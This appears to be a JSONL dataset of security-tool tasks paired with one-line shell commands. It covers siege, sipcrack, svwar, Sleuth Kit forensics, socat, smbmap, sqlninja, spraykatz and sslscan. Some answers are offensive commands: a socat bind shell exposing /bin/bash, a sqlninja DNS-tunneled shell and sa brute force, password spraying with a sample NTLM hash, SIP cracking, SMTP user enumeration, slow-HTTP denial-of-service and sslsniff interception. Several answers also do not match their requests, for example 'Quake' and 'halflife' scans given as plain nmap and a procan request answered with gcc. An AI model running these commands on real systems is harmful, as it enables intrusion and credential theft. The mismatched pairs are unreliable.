{"input": "Guess Oracle SIDs for the IP address 10.1.1.1 using the dictionary file `oracle_sid_list.txt` and use the default port and mode", "answer": "sidguess -i 10.1.1.1 -d oracle_sid_list.txt"}
{"input": "Perform a timed test on \"http://example.com\" for 30 minutes with 100 concurrent users and a random delay of up to 5 seconds between requests", "answer": "siege -c 100 -t 30M -d 5 http://example.com"}
{"input": "Simulate internet user behavior by randomly hitting URLs listed in \"urls.txt\" with 30 concurrent users and a random delay of up to 2 seconds", "answer": "siege -c 30 -i -d 2 -f urls.txt"}
{"input": "Run a test on \"http://example.com\" with 40 concurrent users, repeating the test 5 times, and mark the log file with the text \"Test Run 1\"", "answer": "siege -c 40 -r 5 -m \"Test Run 1\" http://example.com"}
{"input": "Perform a benchmark test on \"http://example.com\" with 60 concurrent users, no delays, and output the final statistics in JSON format", "answer": "siege -c 60 -b -j http://example.com"}
{"input": "Test the URL \"http://example.com\" with 25 concurrent users, repeating the test 15 times, and add a custom User-Agent header to the requests", "answer": "siege -c 25 -r 15 -A \"MyCustomUserAgent\" http://example.com"}
{"input": "Convert a Sigma rule located at `/path/to/rule.yml` into a Splunk query", "answer": "sigma-cli convert -t splunk /path/to/rule.yml"}
{"input": "Analyze all Sigma rules in the directory `/path/to/rules` and output the results in JSON format", "answer": "sigma-cli analyze -o json /path/to/rules"}
{"input": "Check if the Sigma rule located at `/path/to/rule.yml` is valid and compatible with the Splunk backend", "answer": "sigma-cli check -t splunk /path/to/rule.yml"}
{"input": "Launch the SilentTrinity client to connect to a team server running on IP 192.168.1.100 and port 8080", "answer": "silenttrinity client --host 192.168.1.100 --port 8080"}
{"input": "Start the SilentTrinity team server with a custom configuration file located at `/etc/silenttrinity/config.yaml`", "answer": "silenttrinity teamserver --config /etc/silenttrinity/config.yaml"}
{"input": "Connect the SilentTrinity client to a team server running on IP 10.10.10.5 and port 9999, using a custom API key for authentication", "answer": "silenttrinity client --host 10.10.10.5 --port 9999 --api-key my_custom_key"}
{"input": "Crack the SIP authentication using a wordlist file named `passwords.txt` on the sniffed data stored in `sip_dump.log`", "answer": "sipcrack -w passwords.txt sip_dump.log"}
{"input": "Crack the SIP authentication using a wordlist file named `custom_list.txt` on the sniffed data stored in `sip_dump.log`, and print the cracking progress every 100 passwords", "answer": "sipcrack -w custom_list.txt -p 100 sip_dump.log"}
{"input": "Crack the SIP authentication using a wordlist file named `top_passwords.txt` on the sniffed data stored in `sip_dump.log`, and print the cracking progress every 10000 passwords", "answer": "sipcrack -w top_passwords.txt -p 10000 sip_dump.log"}
{"input": "Simulate a SIP server using the embedded UAS scenario, bind to the local IP 192.168.1.2, and log all SIP messages to `messages.log`", "answer": "sipp -sn uas -i 192.168.1.2 -trace_msg messages.log"}
{"input": "Run SIPp with the embedded regexp scenario, inject data from `data.csv`, and log all actions to `actions.log`", "answer": "sipp -sn regexp -inf data.csv -log_file actions.log"}
{"input": "Run SIPp with the embedded branching client scenario, set the local IP to 192.168.1.10, and log call debug information to `calldebug.log`", "answer": "sipp -sn branchc -i 192.168.1.10 -trace_calldebug calldebug.log"}
{"input": "Scan the SIP server at IP 192.168.1.100 to detect available SIP extensions", "answer": "svmap -s 192.168.1.100"}
{"input": "Run a full suite of tests on the SIP server located at 172.16.254.1 using sippts-gui", "answer": "sippts-gui"}
{"input": "Use `sipsak` to trace the route to the SIP server at `sip:192.168.1.1:5060` and include verbose output", "answer": "sipsak -T -s sip:192.168.1.1:5060 -v"}
{"input": "Register a SIP user with the server at `sip:example.com:5060` using `sipsak`, setting the expiration time to 30 seconds", "answer": "sipsak -U -s sip:example.com:5060 --expires=30"}
{"input": "Use `sipsak` to send a random SIP request to `sip:example.com:5060` with a maximum of 10 trashed characters", "answer": "sipsak -R -s sip:example.com:5060 --trash-chars=10"}
{"input": "Use `sipsak` to test the SIP server at `sip:example.com:5060` with a local IP address of `192.168.1.50` and a local port of `5061`", "answer": "sipsak -s sip:example.com:5060 --local-ip=192.168.1.50 --local-port=5061"}
{"input": "Specify the attacker's IP address as 192.168.1.100 and port as 5060 for svcrash to target", "answer": "svcrash -d 192.168.1.100 -p 5060"}
{"input": "Export the scan named \"scan1\" to a PDF file named \"scan1_report.pdf\"", "answer": "svreport export -f pdf -o scan1_report.pdf -s scan1"}
{"input": "Export the scan session named \"scan5\" to a CSV file named \"scan5_data.csv\"", "answer": "svreport export -f csv -o scan5_data.csv -s scan5"}
{"input": "Delete all scan sessions of type \"svcrack\" from the svreport database", "answer": "svreport delete -t svcrack"}
{"input": "Export the scan session named \"scan9\" to a PDF file named \"scan9_report.pdf\" without resolving IP addresses", "answer": "svreport export -f pdf -o scan9_report.pdf -s scan9 -n"}
{"input": "Scan the SIP device at IP 10.0.0.1 on port 5060 for all extensions between 100 and 999, using verbose mode to get detailed output", "answer": "svwar -v -p 5060 -e 100-999 10.0.0.1"}
{"input": "Scan the SIP device at IP 10.0.0.2 using a dictionary file `extensions.txt` to test possible extension names, and bind the scan to the IP 192.168.1.1", "answer": "svwar -d extensions.txt -b 192.168.1.1 10.0.0.2"}
{"input": "Scan the SIP device at IP 10.0.0.4 for extensions between 1 and 9999 using the INVITE method, and force the scan even if initial sanity checks fail", "answer": "svwar -e 1-9999 -m INVITE --force 10.0.0.4"}
{"input": "Scan the SIP device at IP 10.0.0.6 for extensions between 1 and 9999, using a template to format the extensions as \"123%04i999\" (e.g., 1230001999, 1230002999)", "answer": "svwar -e 1-9999 --template=\"123%04i999\" 10.0.0.6"}
{"input": "Scan the SIP device at IP 10.0.0.7 for extensions between 100 and 999, enabling compact mode to reduce packet size, and set a maximum scan time of 60 seconds", "answer": "svwar -e 100-999 -c --maximumtime=60 10.0.0.7"}
{"input": "Scan the SIP device at IP 10.0.0.8 for extensions between 1 and 9999, using the domain `example.org` in the SIP messages, and enable debug mode to print received SIP messages", "answer": "svwar -e 1-9999 --domain=example.org --debug 10.0.0.8"}
{"input": "Display the contents of 5 consecutive file system data units starting at address 5120 in the disk image \"data.img\" using the NTFS file system type", "answer": "blkcat -f ntfs data.img 5120 5"}
{"input": "List all allocated and unallocated blocks from a disk image named \"disk.img\" using the blkls tool", "answer": "blkls -aA disk.img"}
{"input": "Analyze block 1536 in an ext4 file system within a disk image named \"linux.img\" with verbose output", "answer": "blkstat -v -f ext4 linux.img 1536"}
{"input": "Find all occurrences of inode 33445 in the XFS file system image `data.img`, with an image offset of 2048 sectors", "answer": "ffind -a -f xfs -o 2048 data.img 33445"}
{"input": "Display a long listing of all files and directories, including their details, in the disk image \"evidence.dd\" using the FAT file system type", "answer": "fls -l -f fat evidence.dd"}
{"input": "Recursively list all files and directories in the disk image \"backup.img\" using the EXT4 file system type, showing the full path for each file", "answer": "fls -r -p -f ext4 backup.img"}
{"input": "List all files and directories in the disk image \"disk.img\" using the NTFS file system type, and specify a time zone of EST5EDT for the original machine", "answer": "fls -z EST5EDT -f ntfs disk.img"}
{"input": "List all files and directories in the disk image \"image.dd\" using the UFS file system type, and specify a time skew of 3600 seconds for the original machine", "answer": "fls -s 3600 -f ufs image.dd"}
{"input": "Extract the contents of a file with inode number 98765 from a disk image \"backup.img\" located at an offset of 2048 sectors", "answer": "icat -o 2048 backup.img 98765"}
{"input": "Find the metadata structure for the file named \"example.txt\" in the disk image \"disk.img\" using the NTFS file system type", "answer": "ifind -n example.txt -f ntfs disk.img"}
{"input": "Find all inodes in the disk image \"disk.img\" with an image offset of 2048 sectors and verbose output enabled", "answer": "ifind -a -o 2048 -v disk.img"}
{"input": "Locate the metadata structure for the file named \"secret.doc\" in the disk image \"disk.img\" with a time zone setting of UTC", "answer": "ifind -n secret.doc -z UTC disk.img"}
{"input": "List all linked inodes from the disk image \"system.img\" using the ils tool", "answer": "ils -l system.img"}
{"input": "Display all inodes from the disk image \"disk.img\" that are unallocated but were still open (UFS/ExtX only) using the ils tool", "answer": "ils -O disk.img"}
{"input": "List all inodes from the disk image \"disk.img\" with a time skew adjustment of 3600 seconds using the ils tool", "answer": "ils -s 3600 disk.img"}
{"input": "List all inodes from the disk image \"disk.img\" with a device sector size of 512 bytes using the ils tool", "answer": "ils -b 512 disk.img"}
{"input": "Display all inodes from the disk image \"disk.img\" that are allocated and linked using the ils tool", "answer": "ils -a -l disk.img"}
{"input": "Display detailed information about the image file \"data.img\" with verbose output and specify the image type as \"ewf\"", "answer": "img_stat -v -i ewf data.img"}
{"input": "Display all metadata details for inode number 12345 from the image file \"disk.img\" with verbose output", "answer": "istat -v disk.img 12345"}
{"input": "Display metadata for inode number 99001 from the image file \"partition.img\" with a file system type of NTFS", "answer": "istat -f NTFS partition.img 99001"}
{"input": "List all contents of the file system journal in the image file `disk.img` with verbose output", "answer": "jls -v disk.img"}
{"input": "List all contents of the file system journal in the image file `disk.img`, specifying the image type as `aff` and the device sector size as 4096 bytes", "answer": "jls -i aff -b 4096 disk.img"}
{"input": "Output the contents of partition number 3 from a raw disk image named \"disk.img\" to stdout, specifying the image type as raw and using verbose output for detailed information", "answer": "mmcat -i raw -v disk.img 3"}
{"input": "Extract the contents of partition number 1 from a disk image named \"evidence.dd\" with a sector size of 512 bytes, and include verbose output for additional details", "answer": "mmcat -b 512 -v evidence.dd 1"}
{"input": "Output the contents of partition number 8 from a disk image named \"forensic.img\" with a sector size of 512 bytes, an offset of 5120 sectors, and verbose output", "answer": "mmcat -b 512 -o 5120 -v forensic.img 8"}
{"input": "Display the partition layout of a disk image file named \"disk.img\" showing all volume types, including allocated, unallocated, and metadata volumes", "answer": "mmls -aAmM disk.img"}
{"input": "Analyze the partition table of a disk image \"system.img\" with a sector size of 512 bytes, and include verbose output to provide detailed information", "answer": "mmls -b 512 -v system.img"}
{"input": "Analyze the partition layout of a disk image \"disk.img\" with a volume system type of \"dos\" and include unallocated volumes in the output", "answer": "mmls -t dos -A disk.img"}
{"input": "Analyze the partition layout of a disk image \"system.img\" with a volume system type of \"gpt\" and show both allocated and unallocated volumes", "answer": "mmls -t gpt -aA system.img"}
{"input": "Display information about the volume system in the image file \"system.img\" with the volume system type \"gpt\"", "answer": "mmls -t gpt system.img"}
{"input": "Search for the signature \"EF53\" in the file \"ext4.img\" using the ext4 template and a block size of 1024 bytes", "answer": "sigfind -b 1024 -t ext4 EF53 ext4.img"}
{"input": "Search for the signature \"C0FFEE\" in the file \"data.bin\" with an offset of 256 bytes and a block size of 2048 bytes", "answer": "sigfind -b 2048 -o 256 C0FFEE data.bin"}
{"input": "Find the signature \"FFD8FFE0\" in the file \"photo.dat\" using a block size of 512 bytes and an offset of 0 bytes", "answer": "sigfind -b 512 -o 0 FFD8FFE0 photo.dat"}
{"input": "Extract MAC times from a disk image \"evidence.img\" with verbose output to see detailed processing information", "answer": "tsk_gettimes -v evidence.img"}
{"input": "Retrieve MAC times from a disk image \"data.img\" and specify the image type as \"raw\" since it's a raw disk image", "answer": "tsk_gettimes -i raw data.img"}
{"input": "Retrieve MAC times from a disk image \"evidence.img\" and print the version of the tsk_gettimes tool being used", "answer": "tsk_gettimes evidence.img && tsk_gettimes -V"}
{"input": "Collect MAC times from a disk image \"backup.img\" and specify the time zone as \"GMT\" to match the original machine's time zone", "answer": "tsk_gettimes -z GMT backup.img"}
{"input": "Retrieve verbose information about a disk image \"disk.dd\" with a sector size of 1024 bytes and the image type set to \"raw\" using tsk_imageinfo", "answer": "tsk_imageinfo -v -b 1024 -i raw disk.dd"}
{"input": "Add metadata from a disk image named \"backup.img\" to an existing SQLite database located at \"/data/disk.db\", and specify the image type as \"raw\"", "answer": "tsk_loaddb -a -d /data/disk.db -i raw backup.img"}
{"input": "Create a new SQLite database for a disk image named \"evidence.img\" located in \"/cases/disk1/\", and set the device sector size to 512 bytes", "answer": "tsk_loaddb -b 512 /cases/disk1/evidence.img"}
{"input": "Recover all files from a disk image \"disk.img\" using the NTFS file system type and save them to the directory \"ntfs_recovery\"", "answer": "tsk_recover disk.img ntfs_recovery"}
{"input": "Recover all files from a disk image \"disk.img\" with a device sector size of 512 bytes and save them to the directory \"sector_recovery\"", "answer": "tsk_recover -e -b 512 disk.img sector_recovery"}
{"input": "Verbosely list the NTFS USN journal from an image file \"system.img\" while specifying the file system type as NTFS", "answer": "usnjls -f ntfs -v system.img"}
{"input": "List the NTFS USN journal from an image file \"disk.img\" with a sector size of 4096 bytes and include verbose output", "answer": "usnjls -b 4096 -v disk.img"}
{"input": "Set the logging level to `info`, enable logging redirection to a file named `sensor_output.log`, and set the stop signal to `INT`", "answer": "slim-sensor -log-level info -log-file sensor_output.log -stop-signal INT"}
{"input": "Retrieve detailed information about the container image `myapp:latest` using slimtoolkit", "answer": "slimtoolkit inspect myapp:latest"}
{"input": "Export the certificate authority (CA) used by the sliver-server to a file named `ca.crt`", "answer": "sliver-server export-ca --output ca.crt"}
{"input": "Simulate a R-U-Dead-Yet attack on `http://testserver.com` with 200 connections, a 2-second interval between follow-up data, and a test duration of 300 seconds", "answer": "slowhttptest -B -c 200 -i 2 -l 300 -u http://testserver.com"}
{"input": "Run a Range attack on `http://target.org` with 150 connections, a range header starting at 10, and a limit of 5000 bytes for the right boundary", "answer": "slowhttptest -R -c 150 -a 10 -b 5000 -u http://target.org"}
{"input": "Output the results of enumerating the \"C$\" share on the host 10.0.0.1 to a CSV file named \"shares.csv\" using a null session", "answer": "smbmap -H 10.0.0.1 -u \"\" -p \"\" -s C$ --csv shares.csv"}
{"input": "Traverse the directory tree of the \"D$\" share on the host 192.168.0.200 to a depth of 3 using the username \"user\" and password \"password\"", "answer": "smbmap -H 192.168.0.200 -u user -p password -s D$ --depth 3"}
{"input": "Enumerate SMTP users on the server at 192.168.1.100 using the VRFY method, with a maximum of 10 processes, and debug output enabled", "answer": "smtp-user-enum -M VRFY -t 192.168.1.100 -m 10 -d"}
{"input": "Enumerate SMTP users on the server at 192.168.2.200 using the VRFY method, with verbose output and a custom MAIL FROM address \"[email\u00a0protected]\"", "answer": "smtp-user-enum -M VRFY -t 192.168.2.200 -v -f [email\u00a0protected]"}
{"input": "Enumerate SMTP users on the server at 172.16.0.1 using the EXPN method, with a maximum of 8 processes and a custom port 587", "answer": "smtp-user-enum -M EXPN -t 172.16.0.1 -m 8 -p 587"}
{"input": "Enumerate SMTP users on the server at 192.168.4.100 using the EXPN method, with debugging output enabled and a maximum of 12 processes", "answer": "smtp-user-enum -M EXPN -t 192.168.4.100 -d -m 12"}
{"input": "Enumerate SMTP users on the server at 10.2.2.2 using the VRFY method, with a list of usernames from \"userlist.txt\" and the domain \"test.org\" appended to each username", "answer": "smtp-user-enum -M VRFY -U userlist.txt -t 10.2.2.2 -D test.org"}
{"input": "Run a test for the location \"cafe\" using sniffjoke-autotest, downgrading privileges to the user \"testuser\" and group \"testgroup\"", "answer": "sniffjoke-autotest -l cafe -u testuser -g testgroup"}
{"input": "Retrieve statistics about the current SniffJoke configuration and network activity", "answer": "sniffjokectl stat"}
{"input": "Create a Snort Application ID detector for the application \"Netflix Streaming\" using the appid_detector_builder.sh tool", "answer": "appid_detector_builder.sh -a \"Netflix Streaming\""}
{"input": "Build a Snort Application ID detector for the application \"Spotify Music Streaming\" with the appid_detector_builder.sh tool", "answer": "appid_detector_builder.sh -a \"Spotify Music Streaming\""}
{"input": "Build a Snort Application ID detector for the application \"Slack Messaging\" using the appid_detector_builder.sh script", "answer": "appid_detector_builder.sh -a \"Slack Messaging\""}
{"input": "Generate a Snort Application ID detector for the application \"YouTube Video Streaming\" using the appid_detector_builder.sh tool", "answer": "appid_detector_builder.sh -a \"YouTube Video Streaming\""}
{"input": "Create a Snort Application ID detector for the application \"TikTok Social Media\" using the appid_detector_builder.sh script", "answer": "appid_detector_builder.sh -a \"TikTok Social Media\""}
{"input": "Convert the Snort configuration file `snort.conf` to a Snort++ Lua configuration file, but exclude any included or policy files referenced in `snort.conf`", "answer": "snort2lua -c snort.conf -i"}
{"input": "Convert the Snort configuration file `snort.conf` to a Snort++ Lua configuration file, and output any errors encountered during the conversion to a file named `errors.log`", "answer": "snort2lua -c snort.conf 2> errors.log"}
{"input": "Convert the Snort configuration file `snort.conf` to a Snort++ Lua configuration file, and output the result to a file named `snort_new.lua`", "answer": "snort2lua -c snort.conf -o snort_new.lua"}
{"input": "Convert a Snort Unified2 log file named `snort.log` to a PCAP format and save the output as `output.pcap`", "answer": "u2boat -t pcap snort.log output.pcap"}
{"input": "Transform a Unified2 log file called `alerts.u2` into a PCAP file named `alerts.pcap` for further analysis", "answer": "u2boat -t pcap alerts.u2 alerts.pcap"}
{"input": "I need to convert a Snort Unified2 log file stored as `network_logs.u2` into a PCAP file called `network_traffic.pcap`", "answer": "u2boat -t pcap network_logs.u2 network_traffic.pcap"}
{"input": "How can I convert a Unified2 log file named `intrusion.u2` to a PCAP file named `intrusion_traffic.pcap`?", "answer": "u2boat -t pcap intrusion.u2 intrusion_traffic.pcap"}
{"input": "Convert the Snort Unified2 log file `snort_alerts.u2` into a PCAP file named `snort_output.pcap` for packet inspection", "answer": "u2boat -t pcap snort_alerts.u2 snort_output.pcap"}
{"input": "I need to convert a Snort Unified2 log file called `ids_logs.u2` into a PCAP file named `ids_traffic.pcap`", "answer": "u2boat -t pcap ids_logs.u2 ids_traffic.pcap"}
{"input": "Transform a Unified2 log file named `security_alerts.u2` into a PCAP file named `security_traffic.pcap` for forensic analysis", "answer": "u2boat -t pcap security_alerts.u2 security_traffic.pcap"}
{"input": "Use procan to analyze system parameters and print compile-time C defines in a single command", "answer": "gcc -dM -E - < /dev/null"}
{"input": "Forward UDP traffic from port 5000 on the local machine to port 6000 on the remote host 10.0.0.5", "answer": "socat UDP-LISTEN:5000 UDP:10.0.0.5:6000"}
{"input": "Create a Unix domain socket at `/tmp/mysocket` and forward incoming connections to a TCP server at 127.0.0.1 on port 3306", "answer": "socat UNIX-LISTEN:/tmp/mysocket TCP:127.0.0.1:3306"}
{"input": "Relay data between a local UDP listener on port 9999 and a remote UDP server at 10.0.0.10 on port 1234, while dumping the traffic in hexadecimal format", "answer": "socat -x UDP-LISTEN:9999 UDP:10.0.0.10:1234"}
{"input": "Execute a shell command `/bin/bash` and connect its input/output to a TCP listener on port 4444", "answer": "socat TCP-LISTEN:4444 EXEC:/bin/bash"}
{"input": "Set up a TCP listener on port 8081 and forward incoming connections to a remote HTTPS server at 203.0.113.2 on port 443, while enabling verbose logging", "answer": "socat -v TCP-LISTEN:8081 OPENSSL:203.0.113.2:443"}
{"input": "Log all data traffic between a local TCP listener on port 8081 and a remote server at 10.0.0.10 on port 8082 to a file named `traffic.log`.\"", "answer": "socat -v TCP-LISTEN:8081 TCP:10.0.0.10:8082 -lf traffic.log"}
{"input": "Create a secure SSL/TLS connection to a remote server at example.com on port 443 and forward data from a local file named `data.txt`.\"", "answer": "socat OPEN:data.txt OPENSSL:example.com:443"}
{"input": "Set up a Unix domain socket listener at `/tmp/socket` and forward incoming connections to a remote server at 192.168.1.50 on port 8080.\"", "answer": "socat UNIX-LISTEN:/tmp/socket TCP:192.168.1.50:8080"}
{"input": "Create a bidirectional relay between a local TCP listener on port 9999 and a shell command that executes `cat` to read from standard input.\"", "answer": "socat TCP-LISTEN:9999 EXEC:'cat'"}
{"input": "Forward data from a local file named `output.log` to a remote server at 192.168.1.75 on port 3000 using UDP.\"", "answer": "socat OPEN:output.log UDP:192.168.1.75:3000"}
{"input": "Set up a TCP listener on port 8083 and forward incoming connections to a remote server at 10.0.0.30 on port 8084, with a 10-second inactivity timeout.\"", "answer": "socat -T 10 TCP-LISTEN:8083 TCP:10.0.0.30:8084"}
{"input": "Configure the Sparrow-wifi agent to use a Mavlink GPS from a Solo drone and enable Raspberry Pi LEDs to indicate the agent's status", "answer": "sparrowwifiagent --mavlinkgps solo --enable-rpi-leds"}
{"input": "Start the Sparrow-wifi agent without loading any configuration files and specify a custom configuration file named custom_agent.cfg", "answer": "sparrowwifiagent --ignorecfg --cfgfile custom_agent.cfg"}
{"input": "Connect to a Wi-Spy device with device ID 2 for analysis", "answer": "spectool_curses --device 2"}
{"input": "Analyze wireless signals using the Wi-Spy device in range 2 and connect to a remote server at 10.0.0.5 on port 8080", "answer": "spectool_curses --range 2 --net tcp://10.0.0.5:8080"}
{"input": "Connect to a Wi-Spy network server running on IP 192.168.1.100 at port 5000 using spectool_raw", "answer": "spectool_raw -n tcp://192.168.1.100:5000"}
{"input": "Connect to a Wi-Spy network server running on IP 192.168.0.10 at port 3000 and listen for broadcast servers simultaneously", "answer": "spectool_raw -n tcp://192.168.0.10:3000 -b"}
{"input": "Perform a comprehensive scan on the domain \"example.com\" using all available modules in SpiderFoot", "answer": "spiderfoot -s example.com -m all"}
{"input": "Test the web server at 10.10.10.5 on port 443 using the GET method, targeting the \"/admin\" directory with the \".asp\" extension, and start with sequence numbers 0 and 0", "answer": "curl -X GET 'https://10.10.10.5:443/admin.asp'"}
{"input": "Test the TCP service on 192.168.2.150 at port 22 with the spike script \"ssh_test.spk,\" ensuring all variables and strings are processed", "answer": "generic_send_tcp 192.168.2.150 22 ssh_test.spk 0 0"}
{"input": "Perform a scan on the target IP 192.168.1.101 using port 27010 with halflife", "answer": "nmap -p 27010 192.168.1.101"}
{"input": "Deliver a TCP payload to 10.1.1.50 on port 22 using the spike script \"ssh_test.spk\", skipping the first three variables and the first string", "answer": "line_send_tcp 10.1.1.50 22 ssh_test.spk 3 1"}
{"input": "Fuzz the MSRPC service on the target IP 192.168.2.200, port 135, using the GUID 99999999-8888-7777-6666-555555555555, version 6, minor version 0, starting at function number 6, with 12 tries and a maximum of 7 random items", "answer": "msrpcfuzz 192.168.2.200 135 99999999-8888-7777-6666-555555555555 6 0 6 12 7"}
{"input": "Fuzz the MSRPC service on the target IP 10.50.50.50, port 135, using the GUID 44444444-4444-4444-4444-444444444444, version 7, minor version 0, function number 7, with 12 tries and a maximum of 6 random items", "answer": "msrpcfuzz 10.50.50.50 135 44444444-4444-4444-4444-444444444444 7 0 7 12 6"}
{"input": "Perform a scan on the target 172.16.32.45 using Quake, focusing on port 27960", "answer": "nmap -p 27960 172.16.32.45"}
{"input": "Run Quake against the server 192.168.0.50 on port 27960 to gather information", "answer": "nmap -p 27960 192.168.0.50"}
{"input": "Use Quake to scan the network device at 10.0.0.1 on port 27960", "answer": "nmap -p 27960 10.0.0.1"}
{"input": "Analyze the target 203.0.113.10 on port 27960 using Quake", "answer": "nmap -p 27960 203.0.113.10"}
{"input": "Use Quake to probe the target 10.129.228.124 on port 27960", "answer": "nmap -p 27960 10.129.228.124"}
{"input": "Perform a Quake scan on the IP 172.17.0.3 targeting port 27960", "answer": "nmap -p 27960 172.17.0.3"}
{"input": "Test the MSRPC service on the target 10.10.20.30 at port 445 with function code 0x1F", "answer": "nmap -p 445 --script msrpc-enum 10.10.20.30"}
{"input": "Run the SPIRE agent with a configuration file located at `/etc/spire/agent.conf` and specify a custom socket path for communication", "answer": "spire-agent run -config /etc/spire/agent.conf -socketPath /var/run/spire/sockets/agent.sock"}
{"input": "Validate the SPIRE server configuration file located at `/etc/spire/conf/server.conf` to ensure it is correct", "answer": "spire-server validate /etc/spire/conf/server.conf"}
{"input": "Generate a JWT token for a workload with the SPIFFE ID `spiffe://example.org/workload` and an audience of `example-audience`", "answer": "spire-server jwt mint -spiffeID spiffe://example.org/workload -audience example-audience"}
{"input": "Fetch the bundle of trust domains from the SPIRE server", "answer": "spire-server bundle show"}
{"input": "Fetch the federation relationship with the trust domain `spiffe://federated.example.org`", "answer": "spire-server federation show -trustDomain spiffe://federated.example.org"}
{"input": "Create a federation relationship with the trust domain `spiffe://federated.example.org` and bundle endpoint URL `https://federated.example.org/bundle`", "answer": "spire-server federation create -trustDomain spiffe://federated.example.org -bundleEndpointURL https://federated.example.org/bundle"}
{"input": "Delete the federation relationship with the trust domain `spiffe://federated.example.org`", "answer": "spire-server federation delete -trustDomain spiffe://federated.example.org"}
{"input": "Export the results of a sploitscan query for CVE-2021-34527 to an HTML file named `report.html`", "answer": "sploitscan CVE-2021-34527 -e html -o report.html"}
{"input": "Change the Bluetooth device's NAME to \"MyDevice\", CLASS to \"0x1F00\", and BD_ADDR to \"00:11:22:33:44:55\" using the interface `hci0`", "answer": "spooftooph -i hci0 -n MyDevice -c 0x1F00 -a 00:11:22:33:44:55"}
{"input": "Clone a Bluetooth device every 10 seconds using the interface `hci0` and disable the banner for smaller screens", "answer": "spooftooph -i hci0 -t 10 -B"}
{"input": "Clone a Bluetooth device with a random NAME, CLASS, and BD_ADDR, and write the details to a CSV logfile named `random_clone.csv` using the interface `hci0`", "answer": "spooftooph -i hci0 -R -w random_clone.csv"}
{"input": "Perform a password spray attack on the domain \"ad.local\" using the password \"Spring2023\", and connect to a Neo4j database at \"192.168.1.100\" with the username \"admin\" and password \"neo4jpass\"", "answer": "sprayhound -U userlist.txt -d ad.local -p Spring2023 -nh 192.168.1.100 -nu admin -np neo4jpass"}
{"input": "Use Atomizer to spray passwords on the IMAP service of `imap.example.com` with a CSV file `creds.csv`. Specify the username row as `Username` and the password row as `Pass`", "answer": "atomizer imap imap.example.com --csvfile creds.csv --user-row-name Username --pass-row-name Pass"}
{"input": "Use spraykatz to spray the username \"local_admin\" with the password \"Local@123\" on the target IP 192.168.0.100, and set the domain to \".\" to indicate a local account", "answer": "spraykatz -u local_admin -p Local@123 -t 192.168.0.100 -d ."}
{"input": "Run spraykatz with the username \"backup_user\" and NTLM hash \"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\" on the target IPs 192.168.2.1 and 192.168.2.2, and set the domain to \"BACKUP\"", "answer": "spraykatz -u backup_user -p aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -t 192.168.2.1,192.168.2.2 -d BACKUP"}
{"input": "Start the sqlmapapi server using the `gevent` adapter for improved performance", "answer": "sqlmapapi -s --adapter gevent"}
{"input": "Start the sqlmapapi server on port `9999` and use the `cherrypy` adapter for the server", "answer": "sqlmapapi -s -p 9999 --adapter cherrypy"}
{"input": "Fingerprint the SQL Server at 192.168.1.10 to identify the user, check for `xp_cmdshell`, and gather other details using the configuration file `sqlninja.conf`", "answer": "sqlninja -t 192.168.1.10 -m f -f sqlninja.conf"}
{"input": "Bruteforce the `sa` account password on the SQL Server at 192.168.1.10 using the wordlist `passwords.txt` and the configuration file `sqlninja.conf`", "answer": "sqlninja -m b -u sa -t 192.168.1.10 -w passwords.txt -f sqlninja.conf"}
{"input": "Attempt a DNS tunneled shell on the SQL Server at 192.168.1.10 using the configuration file `sqlninja.conf`", "answer": "sqlninja -m d -f sqlninja.conf -t 192.168.1.10"}
{"input": "Analyze a previously captured SSL/TLS traffic dump stored in `traffic.pcap` and display all details, including timestamps and packet contents", "answer": "ssldump -r traffic.pcap -a -T"}
{"input": "Decrypt SSL/TLS traffic on interface `eth1` using a private key file `server.key` and display all packet details, including application data", "answer": "ssldump -i eth1 -k server.key -a"}
{"input": "Analyze SSL/TLS traffic from a packet capture file `dump.pcap`, display all details, and include the SSL session ID for each packet", "answer": "ssldump -r dump.pcap -a -S"}
{"input": "Run sslh-ev in the foreground, listening on port 443, and forward SSH traffic to 192.168.1.100:22 and HTTPS traffic to 192.168.1.101:443", "answer": "sslh-ev -f -p 0.0.0.0:443 --ssh=192.168.1.100:22 --tls=192.168.1.101:443"}
{"input": "Run sslh-ev in inetd mode, forward TLS traffic to 10.0.0.3:443, and print IP addresses and ports as numbers", "answer": "sslh-ev -i --tls=10.0.0.3:443 -n"}
{"input": "Set up sslh-ev to forward WireGuard traffic to 10.0.0.4:51820, use a chroot directory `/var/lib/sslh`, and change to the user `sslhuser`", "answer": "sslh-ev --wireguard=10.0.0.4:51820 -C /var/lib/sslh -u sslhuser"}
{"input": "Run sslh-ev in transparent mode, listen on port 8443, and forward HTTPS traffic to 192.168.1.103:443", "answer": "sslh-ev --transparent -p 0.0.0.0:8443 --tls=192.168.1.103:443"}
{"input": "Run sslh-select with a configuration file located at `/etc/sslh.conf`, logging to syslog with the facility set to `local0`, and forwarding XMPP traffic to `10.0.0.2:5222`", "answer": "sslh-select -F /etc/sslh.conf --syslog-facility=local0 --xmpp=10.0.0.2:5222"}
{"input": "Scan the server at `192.168.1.100` for all supported SSL/TLS versions and ciphers, and show the full certificate information", "answer": "sslscan --tlsall --show-certificate 192.168.1.100"}
{"input": "Check if the server at `example.com` supports SSLv2 and SSLv3, and output the results to an XML file named `results.xml`", "answer": "sslscan --ssl2 --ssl3 --xml=results.xml example.com"}
{"input": "Scan the server at `203.0.113.10` for all TLS ciphers, disable colored output, and pause for 500 milliseconds between connection requests", "answer": "sslscan --tlsall --no-colour --sleep=500 203.0.113.10"}
{"input": "Scan the server at `192.168.0.1` for all TLS ciphers, enumerate signature algorithms, and use IANA/RFC cipher names instead of OpenSSL names", "answer": "sslscan --tlsall --show-sigs --iana-names 192.168.0.1"}
{"input": "Scan the server at `example.com` for all TLS ciphers, and do not check for OpenSSL Heartbleed vulnerability", "answer": "sslscan --tlsall --no-heartbleed example.com"}
{"input": "Scan the server at `10.10.10.10` for all TLS ciphers, and request an OCSP response from the server", "answer": "sslscan --tlsall --ocsp 10.10.10.10"}
{"input": "Scan the server at `example.net` for all TLS ciphers, and show the full certificate chain information", "answer": "sslscan --tlsall --show-certificates example.net"}
{"input": "Scan the server at `192.168.2.1` for all TLS ciphers, and disable checking for TLS compression (CRIME vulnerability)", "answer": "sslscan --tlsall --no-compression 192.168.2.1"}
{"input": "Run sslsniff in targeted mode, using the directory `/root/certs/` containing certificates and keys, listen for SSL traffic on port 8443, and log all intercepted data to `/root/targeted_log.txt`", "answer": "sslsniff -t -c /root/certs/ -s 8443 -w /root/targeted_log.txt"}
